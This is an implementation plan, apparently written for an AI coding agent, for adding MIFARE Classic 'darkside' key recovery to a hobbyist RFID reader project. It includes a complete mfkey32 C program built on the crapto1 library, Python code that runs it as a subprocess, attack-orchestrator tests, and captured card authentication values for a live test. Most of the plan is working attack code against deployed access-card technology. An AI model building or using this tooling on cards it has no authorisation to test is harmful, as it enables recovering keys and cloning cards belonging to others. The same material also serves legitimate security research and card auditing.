# mfkey32 Darkside Key Recovery Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Implement end-to-end MIFARE Classic darkside key recovery using the crapto1 C library, so that 2+ NACK events from the firmware produce a recovered 48-bit key displayed in the GUI.

**Architecture:** The AVR firmware already collects darkside NACK events (NT + NR||AR). Python tracks NT/NACK pairs in the attack orchestrator, then calls a compiled `mfkey32` CLI tool (built from the open-source crapto1 library) via subprocess. The CLI takes two authentication exchanges and outputs the recovered key. The GUI displays results and stores recovered keys.

**Tech Stack:** C (crapto1 library, gcc/mingw), Python 3 (subprocess, existing attack/serial infrastructure), PlatformIO (AVR firmware)

---

## Key Technical Decisions

### crapto1 as CLI tool (not shared library)
Simpler than ctypes — just `subprocess.run(["./mfkey32", uid, nt0, nr0, ar0, nt1, nr1, ar1])`. Parse stdout for the key. Cross-platform (gcc on Windows via MSYS2 which is already installed).

### NT-NACK pairing
The firmware sends `DARK:NT:<hex>` immediately before `DARK:NACK:<hex>` or `DARK:TIMEOUT`. The orchestrator tracks `_last_nt` to pair them. Currently `_last_nt` is referenced but never set — this needs fixing.

### No firmware protocol changes needed
The existing `DARK:NT:` + `DARK:NACK:` protocol already provides all data mfkey32 needs. The 8-byte NACK payload is the NR||AR we sent (bytes 0-3 = NR, bytes 4-7 = AR).

---

## Task 1: Add crapto1 C source files

**Files:**
- Create: `Projects/RFID Card Reader/gui/crapto1/crapto1.c`
- Create: `Projects/RFID Card Reader/gui/crapto1/crapto1.h`
- Create: `Projects/RFID Card Reader/gui/crapto1/crypto1.c`
- Create: `Projects/RFID Card Reader/gui/crapto1/parity.h`

**Step 1: Create the crapto1 directory**

```bash
mkdir -p "Projects/RFID Card Reader/gui/crapto1"
```

**Step 2: Download crapto1 source from nfc-tools/mfcuk**

Fetch `crapto1.c`, `crapto1.h`, `crypto1.c`, and `parity.h` from `https://github.com/nfc-tools/mfcuk/tree/master/src/`. These are the canonical open-source implementations of the Crypto1 cipher and LFSR recovery functions.

Key functions we need:
- `lfsr_recovery32(uint32_t ks2, uint32_t in)` — returns candidate LFSR states
- `lfsr_rollback_word(struct Crypto1State *s, uint32_t in, int fb)` — reverse LFSR
- `crypto1_word(struct Crypto1State *s, uint32_t in, int fb)` — forward LFSR
- `crypto1_get_lfsr(struct Crypto1State *s, uint64_t *key)` — extract key from state
- `prng_successor(uint32_t x, uint32_t n)` — MIFARE PRNG

**Step 3: Commit**

```bash
git add "Projects/RFID Card Reader/gui/crapto1/"
git commit -m "feat: add crapto1 C library source files"
```

---

## Task 2: Write mfkey32 CLI tool

**Files:**
- Create: `Projects/RFID Card Reader/gui/crapto1/mfkey32.c`

**Step 1: Write the mfkey32 CLI**

Based on the proven mfkey32v2 algorithm. Takes command-line args: `<uid> <nt0> <nr0> <ar0> <nt1> <nr1> <ar1>`. Outputs `Found key: <12-hex-chars>` on success, `No key found` on failure.

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include "crapto1.h"

int main(int argc, char *argv[]) {
    if (argc < 8) {
        fprintf(stderr, "Usage: %s <uid> <nt0> <nr0> <ar0> <nt1> <nr1> <ar1>\n", argv[0]);
        return 1;
    }

    uint32_t uid, nt0, nr0_enc, ar0_enc, nt1, nr1_enc, ar1_enc;
    sscanf(argv[1], "%x", &uid);
    sscanf(argv[2], "%x", &nt0);
    sscanf(argv[3], "%x", &nr0_enc);
    sscanf(argv[4], "%x", &ar0_enc);
    sscanf(argv[5], "%x", &nt1);
    sscanf(argv[6], "%x", &nr1_enc);
    sscanf(argv[7], "%x", &ar1_enc);

    uint32_t p64  = prng_successor(nt0, 64);
    uint32_t p64b = prng_successor(nt1, 64);

    struct Crypto1State *s, *t;
    uint64_t key;

    s = lfsr_recovery32(ar0_enc ^ p64, 0);

    for (t = s; t->odd | t->even; ++t) {
        lfsr_rollback_word(t, 0, 0);
        lfsr_rollback_word(t, nr0_enc, 1);
        lfsr_rollback_word(t, uid ^ nt0, 0);
        crypto1_get_lfsr(t, &key);

        crypto1_word(t, uid ^ nt1, 0);
        crypto1_word(t, nr1_enc, 1);
        if (ar1_enc == (crypto1_word(t, 0, 0) ^ p64b)) {
            printf("Found key: %012" PRIx64 "\n", key);
            free(s);
            return 0;
        }
    }

    free(s);
    printf("No key found\n");
    return 1;
}
```

**Step 2: Build and test with synthetic data**

```bash
cd "Projects/RFID Card Reader/gui/crapto1"
gcc -O2 -o mfkey32.exe mfkey32.c crapto1.c crypto1.c -lm
```

Verify it compiles and runs (even with dummy args it should output "No key found" cleanly).

**Step 3: Commit**

```bash
git add "Projects/RFID Card Reader/gui/crapto1/mfkey32.c"
git commit -m "feat: add mfkey32 CLI tool for darkside key recovery"
```

---

## Task 3: Fix NT-NACK pairing in AttackOrchestrator

**Files:**
- Modify: `Projects/RFID Card Reader/gui/attack.py`
- Test: `Projects/RFID Card Reader/gui/tests/test_attack.py`

**Step 1: Write failing test for NT-NACK pairing**

Add to `tests/test_attack.py`:

```python
def test_darkside_nack_pairs_nt():
    """NACK events must include the preceding NT value."""
    serial = FakeSerial()
    orch = AttackOrchestrator(serial)
    orch.start_darkside(sector=0)

    # Feed UID
    orch.feed({"type": "DARK", "subtype": "UID", "uid": "E413B3DA"})
    # Feed NT then NACK (as firmware sends them)
    orch.feed({"type": "DARK", "subtype": "NT", "nt": "A9770B9F"})
    orch.feed({"type": "DARK", "subtype": "NACK", "nr_ar": "29012B032D052F07"})

    assert len(orch._nack_data) == 1
    assert orch._nack_data[0]["nt"] == 0xA9770B9F
    assert orch._nack_data[0]["nr_ar"] == bytes.fromhex("29012B032D052F07")
```

**Step 2: Run test to verify it fails**

```bash
cd "Projects/RFID Card Reader/gui"
python -m pytest tests/test_attack.py::test_darkside_nack_pairs_nt -v
```

Expected: FAIL — `orch._nack_data[0]["nt"]` is `None`

**Step 3: Fix AttackOrchestrator to track last NT**

In `attack.py`, add `_last_nt` tracking:

```python
def __init__(self, serial_handler):
    # ... existing code ...
    self._last_nt = None  # ADD THIS

def _handle_darkside(self, msg: dict):
    if msg.get("type") != "DARK":
        return

    subtype = msg.get("subtype")
    if subtype == "UID":
        self._uid = int(msg["uid"], 16)
        self.result_queue.put({"event": "dark_uid", "uid": msg["uid"]})
    elif subtype == "NT":
        self._last_nt = int(msg["nt"], 16)  # ADD THIS
    elif subtype == "NACK":
        nt = self._last_nt  # CHANGED: use tracked NT
        nr_ar = bytes.fromhex(msg["nr_ar"])
        self._nack_data.append({"nt": nt, "nr_ar": nr_ar})
        self._last_nt = None  # ADDED: consume the NT
        self.result_queue.put({
            "event": "dark_nack",
            "count": len(self._nack_data)
        })
    elif subtype == "TIMEOUT":
        self._last_nt = None  # ADDED: consume the NT on timeout too
        self.result_queue.put({"event": "dark_timeout"})
    elif subtype == "DONE":
        # ... existing DONE handling unchanged ...
```

**Step 4: Run test to verify it passes**

```bash
python -m pytest tests/test_attack.py::test_darkside_nack_pairs_nt -v
```

Expected: PASS

**Step 5: Commit**

```bash
git add "Projects/RFID Card Reader/gui/attack.py" "Projects/RFID Card Reader/gui/tests/test_attack.py"
git commit -m "fix: track last NT for NACK pairing in darkside orchestrator"
```

---

## Task 4: Implement darkside_recover() with mfkey32 subprocess

**Files:**
- Modify: `Projects/RFID Card Reader/gui/key_recovery.py`
- Test: `Projects/RFID Card Reader/gui/tests/test_key_recovery.py`

**Step 1: Write failing test for darkside_recover**

Add to `tests/test_key_recovery.py`:

```python
import os
import subprocess

def test_darkside_recover_calls_mfkey32(tmp_path, monkeypatch):
    """darkside_recover should call mfkey32 and parse the key."""
    from key_recovery import darkside_recover

    # Mock subprocess.run to simulate mfkey32 output
    class FakeResult:
        stdout = "Found key: ffffffffffff\n"
        returncode = 0

    def fake_run(cmd, **kwargs):
        return FakeResult()

    monkeypatch.setattr(subprocess, "run", fake_run)

    nack_data = [
        {"nt": 0xA9770B9F, "nr_ar": bytes.fromhex("29012B032D052F07")},
        {"nt": 0x673D799C, "nr_ar": bytes.fromhex("D801DA03DC05DE07")},
    ]
    candidates = darkside_recover(0xE413B3DA, nack_data)
    assert len(candidates) >= 1
    assert candidates[0] == bytes.fromhex("FFFFFFFFFFFF")


def test_darkside_recover_needs_two_nacks():
    """Should return empty with fewer than 2 NACKs."""
    from key_recovery import darkside_recover
    nack_data = [{"nt": 0x12345678, "nr_ar": bytes.fromhex("0102030405060708")}]
    assert darkside_recover(0xAABBCCDD, nack_data) == []
```

**Step 2: Run test to verify it fails**

```bash
python -m pytest tests/test_key_recovery.py::test_darkside_recover_calls_mfkey32 -v
```

Expected: FAIL — darkside_recover returns empty list

**Step 3: Implement darkside_recover**

Replace the stub in `key_recovery.py`:

```python
import subprocess
import os
import itertools

def _get_mfkey32_path():
    """Find the mfkey32 executable relative to this file."""
    base = os.path.dirname(os.path.abspath(__file__))
    exe = os.path.join(base, "crapto1", "mfkey32.exe")
    if not os.path.exists(exe):
        # Try without .exe (Linux/Mac)
        exe = os.path.join(base, "crapto1", "mfkey32")
    return exe


def darkside_recover(uid: int, nack_data: list[dict]) -> list[bytes]:
    if len(nack_data) < 2:
        return []

    exe = _get_mfkey32_path()
    candidates = []

    # Try pairs of NACK events until we find a key
    for i, j in itertools.combinations(range(len(nack_data)), 2):
        d0 = nack_data[i]
        d1 = nack_data[j]

        if d0["nt"] is None or d1["nt"] is None:
            continue

        nr0 = int.from_bytes(d0["nr_ar"][:4], "big")
        ar0 = int.from_bytes(d0["nr_ar"][4:], "big")
        nr1 = int.from_bytes(d1["nr_ar"][:4], "big")
        ar1 = int.from_bytes(d1["nr_ar"][4:], "big")

        cmd = [
            exe,
            f"{uid:08X}",
            f"{d0['nt']:08X}",
            f"{nr0:08X}",
            f"{ar0:08X}",
            f"{d1['nt']:08X}",
            f"{nr1:08X}",
            f"{ar1:08X}",
        ]

        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0 and "Found key:" in result.stdout:
                key_hex = result.stdout.split("Found key:")[1].strip()
                key_bytes = bytes.fromhex(key_hex)
                if key_bytes not in candidates:
                    candidates.append(key_bytes)
                    return candidates  # First valid key is enough
        except (subprocess.TimeoutExpired, FileNotFoundError, ValueError):
            continue

    return candidates
```

**Step 4: Run tests to verify they pass**

```bash
python -m pytest tests/test_key_recovery.py -v
```

Expected: ALL PASS

**Step 5: Commit**

```bash
git add "Projects/RFID Card Reader/gui/key_recovery.py" "Projects/RFID Card Reader/gui/tests/test_key_recovery.py"
git commit -m "feat: implement darkside key recovery via mfkey32 subprocess"
```

---

## Task 5: Update AttackOrchestrator for auto-recovery

**Files:**
- Modify: `Projects/RFID Card Reader/gui/attack.py`
- Test: `Projects/RFID Card Reader/gui/tests/test_attack.py`

**Step 1: Write failing test for auto-recovery after 2 NACKs**

Add to `tests/test_attack.py`:

```python
def test_darkside_auto_recovery_after_two_nacks(monkeypatch):
    """Orchestrator should attempt key recovery after collecting 2+ NACKs on DONE."""
    import subprocess

    class FakeResult:
        stdout = "Found key: a0a1a2a3a4a5\n"
        returncode = 0

    monkeypatch.setattr(subprocess, "run", lambda cmd, **kw: FakeResult())

    serial = FakeSerial()
    orch = AttackOrchestrator(serial)
    orch.start_darkside(sector=5)

    orch.feed({"type": "DARK", "subtype": "UID", "uid": "E413B3DA"})

    # First NACK
    orch.feed({"type": "DARK", "subtype": "NT", "nt": "A9770B9F"})
    orch.feed({"type": "DARK", "subtype": "NACK", "nr_ar": "29012B032D052F07"})

    # Second NACK
    orch.feed({"type": "DARK", "subtype": "NT", "nt": "673D799C"})
    orch.feed({"type": "DARK", "subtype": "NACK", "nr_ar": "D801DA03DC05DE07"})

    # Trigger completion
    orch.feed({"type": "DARK", "subtype": "DONE"})

    # Check result queue
    results = []
    while not orch.result_queue.empty():
        results.append(orch.result_queue.get_nowait())
    complete = [r for r in results if r.get("event") == "dark_complete"]
    assert len(complete) == 1
    assert len(complete[0]["candidates"]) >= 1
    assert complete[0]["candidates"][0] == "a0a1a2a3a4a5"
```

**Step 2: Run test to verify it fails**

```bash
python -m pytest tests/test_attack.py::test_darkside_auto_recovery_after_two_nacks -v
```

Expected: FAIL — currently `_last_nt` isn't tracked, NACKs have no NT, recovery returns `[]`

**Step 3: Verify test passes (after Task 3+4 fixes)**

The fixes from Tasks 3 and 4 should make this pass. Run:

```bash
python -m pytest tests/test_attack.py -v
```

Expected: ALL PASS

**Step 4: Commit**

```bash
git add "Projects/RFID Card Reader/gui/tests/test_attack.py"
git commit -m "test: add auto-recovery test for darkside orchestrator"
```

---

## Task 6: Increase darkside timeout in GUI

**Files:**
- Modify: `Projects/RFID Card Reader/gui/app.py`

**Step 1: Find and update the timeout**

In `app.py`, the `OperationGuard` has a 30s timeout (line 37: `timeout=30`). For darkside attacks, this is too short — at ~5 NACKs per 30s, we need at least 60-120s to reliably get 2+ NACKs.

Find where darkside starts and set a longer timeout:

```python
# In the darkside start handler, use a longer timeout:
self._guard.start("darkside")
```

The `check_timeout` call uses default 30s. Change the timeout for darkside operations to 300s (5 minutes) by modifying the `check_timeout` call site, or by passing a timeout parameter when starting darkside.

Simplest fix: in the `_poll_serial` method or wherever `check_timeout` is called, check if the current operation is "darkside" and use a longer timeout:

```python
# Change check_timeout to use 300s for attacks
if self._guard.check_timeout(timeout=300 if self._guard.operation in ("darkside", "nested") else 30):
```

**Step 2: Verify manually**

Run the GUI, connect, start darkside. Verify it doesn't timeout after 30s.

**Step 3: Commit**

```bash
git add "Projects/RFID Card Reader/gui/app.py"
git commit -m "fix: increase darkside/nested attack timeout to 5 minutes"
```

---

## Task 7: Build crapto1 and integration test

**Files:**
- Build: `Projects/RFID Card Reader/gui/crapto1/mfkey32.exe`

**Step 1: Build mfkey32**

```bash
cd "Projects/RFID Card Reader/gui/crapto1"
gcc -O2 -o mfkey32.exe mfkey32.c crapto1.c crypto1.c -lm
```

Expected: clean compile, no warnings with `-Wall`

**Step 2: Test with real log data**

From the log file, the 5 NACK events with their paired NTs are:

| # | NT | NR_AR |
|---|-----|-------|
| 0 | A9770B9F | 29012B032D052F07 |
| 1 | 673D799C | D801DA03DC05DE07 |
| 2 | 5F10C17E | 360238043A063C08 |
| 3 | D4219564 | 360438063A083C0A |
| 4 | 65A073A1 | 910493069508970A |

UID: E413B3DA

Test pair (0,1):
```bash
./mfkey32.exe E413B3DA A9770B9F 29012B03 2D052F07 673D799C D801DA03 DC05DE07
```

If a key is found, the attack works end-to-end. If not, try other pairs (0,2), (0,3), etc.

**Step 3: Run full test suite**

```bash
cd "Projects/RFID Card Reader/gui"
python -m pytest tests/ -v
```

Expected: ALL PASS

**Step 4: Commit built binary**

```bash
git add "Projects/RFID Card Reader/gui/crapto1/mfkey32.exe"
git commit -m "build: add compiled mfkey32 binary for darkside key recovery"
```

---

## Task 8: Add .gitignore for crapto1 build artifacts

**Files:**
- Create: `Projects/RFID Card Reader/gui/crapto1/.gitignore`

**Step 1: Create .gitignore**

```
*.o
*.obj
```

Note: we DO want to commit `mfkey32.exe` so users don't need to build it themselves.

**Step 2: Commit**

```bash
git add "Projects/RFID Card Reader/gui/crapto1/.gitignore"
git commit -m "chore: add .gitignore for crapto1 build artifacts"
```

---

## Summary

| Task | What | Files |
|------|------|-------|
| 1 | Add crapto1 C sources | `gui/crapto1/{crapto1,crypto1}.{c,h}`, `parity.h` |
| 2 | Write mfkey32 CLI | `gui/crapto1/mfkey32.c` |
| 3 | Fix NT-NACK pairing | `gui/attack.py` |
| 4 | Implement darkside_recover | `gui/key_recovery.py` |
| 5 | Test auto-recovery flow | `gui/tests/test_attack.py` |
| 6 | Increase attack timeout | `gui/app.py` |
| 7 | Build + integration test | compile + real data test |
| 8 | Gitignore for build artifacts | `gui/crapto1/.gitignore` |
